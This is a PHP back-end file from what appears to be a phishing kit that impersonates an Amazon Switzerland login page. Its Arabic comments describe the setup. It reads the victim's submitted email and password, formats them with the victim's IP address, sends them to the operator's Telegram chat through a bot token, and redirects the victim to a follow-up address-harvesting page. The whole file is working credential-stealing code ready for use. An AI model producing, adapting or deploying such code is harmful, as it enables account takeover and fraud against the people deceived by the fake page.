<?php
// تضمين الملفات الأساسية الخاصة بك لإعدادات التلغرام والدوال المعرفة
include "v.php";
include "t.php";

// استقبال البيانات المدخلة في الحقول بناءً على الـ name المخصص لكل منها
$user_email = isset($_POST['email']) ? $_POST['email'] : '';
$user_pass  = isset($_POST['password']) ? $_POST['password'] : '';

// صياغة الرسالة الموجهة للـ Telegram بشكل منظم
$message  = "========= Amazon CH Login =========\n";
$message .= "EMAIL : " . $user_email . "\n";
$message .= "PASS  : " . $user_pass . "\n";
$message .= "IP    : " . (isset($ib) ? $ib : $_SERVER['REMOTE_ADDR']) . "\n";
$message .= "===================================\n";

// إرسال البيانات باستخدام المتغيرات المستدعاة من ملفات الإعداد الخاصة بك
$tk = $token; 
$chid = $chatid; 
sendMessage($chid, $message, $tk);

// التوجيه التلقائي مع إضافة الـ Hash العشوائي إلى صفحة إدخال العنوان التالية
header("Location: ./address.php?" . md5(microtime()));
exit();
?>